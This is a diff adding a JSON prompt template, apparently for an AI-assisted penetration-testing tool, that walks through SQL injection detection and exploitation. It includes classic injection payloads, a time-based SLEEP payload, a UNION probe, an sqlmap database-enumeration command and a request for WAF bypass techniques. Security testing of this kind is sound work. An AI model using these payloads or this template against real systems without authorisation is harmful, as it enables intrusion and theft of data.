@@ -1,0 +1,10 @@
+{
+  "name": "SQL Injection",
+  "description": "SQL injection testing and exploitation",
+  "category": "web",
+  "variables": [
+    "url",
+    "parameter"
+  ],
+  "content": "Test SQL injection at {url} in parameter {parameter}.\n\nSteps :\n1. Detection: basic payloads (`'`, `\"`, `1 OR 1=1`)\n2. Identify the DBMS (MySQL, PostgreSQL, MSSQL, Oracle)\n3. Determine the type (error-based, blind, time-based, UNION)\n4. Exploitation: extract data, bypass authentication\n\nTest payloads :\n```\n' OR '1'='1\n\" OR \"1\"=\"1\n1' AND SLEEP(5)--\n1 UNION SELECT NULL,NULL--\n```\n\nsqlmap command :\n```bash\nsqlmap -u \"{url}\" -p {parameter} --dbs --batch\n```\n\nIf a WAF is detected, suggest bypass techniques."
+}
